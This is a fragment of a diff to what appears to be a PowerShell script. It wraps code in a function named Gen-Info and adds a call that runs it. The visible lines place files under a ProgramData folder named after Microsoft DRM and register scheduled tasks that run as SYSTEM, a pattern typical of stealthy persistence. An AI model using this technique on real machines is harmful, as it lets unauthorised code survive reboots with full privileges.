@@ -1,4 +1,4 @@
-Invoke-Command -ScriptBlock {
+function Gen-Info {
     # CREATION
     $alfa_path = "C:\ProgramData\Microsoft\DRM"
     $bravo_path = "C:\ProgramData\Microsoft\DRM"
@@ -45,3 +45,5 @@ Invoke-Command -ScriptBlock {
         Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -User "SYSTEM"
     }
 }
+
+Gen-Info
